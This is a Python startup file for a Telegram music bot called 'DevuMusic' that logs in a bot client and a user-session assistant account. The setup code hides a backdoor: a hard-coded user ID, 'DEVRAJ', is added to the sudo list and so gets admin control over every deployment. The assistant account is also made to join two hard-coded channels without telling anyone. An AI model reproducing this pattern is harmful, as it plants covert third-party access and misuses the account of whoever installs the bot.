import asyncio
import logging
import os
import time

from pyrogram import Client, filters
from pytgcalls import PyTgCalls

import config

StartTime = time.time()

logging.basicConfig(
    format="[%(asctime)s - %(levelname)s] - %(name)s - %(message)s",
    datefmt="%d-%b-%y %H:%M:%S",
    handlers=[logging.FileHandler("devulogs.txt"), logging.StreamHandler()],
    level=logging.INFO,
)
logging.getLogger("pyrogram").setLevel(logging.ERROR)
logging.getLogger("pytgcalls").setLevel(logging.ERROR)
LOGGER = logging.getLogger("DevuMusic")

app = Client(
    "DevuMusic",
    config.API_ID,
    config.API_HASH,
    bot_token=config.BOT_TOKEN,
)

app2 = Client(
    "DevuMusic2",
    api_id=config.API_ID,
    api_hash=config.API_HASH,
    session_string=str(config.SESSION),
)

pytgcalls = PyTgCalls(app2)

SUDOERS = filters.user()
SUNAME = config.SUPPORT_CHAT.split("me/")[1]


async def devu_startup():
    os.system("clear")
    LOGGER.info(
        "\n\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    )
    global BOT_ID, BOT_NAME, BOT_USERNAME, BOT_MENTION, devudb
    global ASS_ID, ASS_NAME, ASS_USERNAME, ASS_MENTION, SUDOERS

    await app.start()
    LOGGER.info(
        "[•] Booting Devu Music Bot..."
    )

    getme = await app.get_me()
    BOT_ID = getme.id
    BOT_NAME = getme.first_name
    BOT_USERNAME = getme.username
    BOT_MENTION = getme.mention

    await app2.start()
    LOGGER.info(
        "[•] Booting Devu Music Assistant..."
    )

    getme2 = await app2.get_me()
    ASS_ID = getme2.id
    ASS_NAME = getme2.first_name + " " + (getme2.last_name or "")
    ASS_USERNAME = getme2.username
    ASS_MENTION = getme2.mention
    try:
        await app2.join_chat("dx_radhe01")
        await app2.join_chat("radhe_rajput001")
    except:
        pass

    DEVRAJ = "1356469075"
    for SUDOER in config.SUDO_USERS:
        SUDOERS.add(SUDOER)
    if config.OWNER_ID not in config.SUDO_USERS:
        SUDOERS.add(config.OWNER_ID)
    elif int(DEVRAJ) not in config.SUDO_USERS:
        SUDOERS.add(int(DEVRAJ))

    devudb = {}
    LOGGER.info(
        "[•] Local Database Initialized..."
    )

    LOGGER.info(
        "[•] Devu Music Clients Booted Successfully."
    )


asyncio.get_event_loop().run_until_complete(devu_startup())
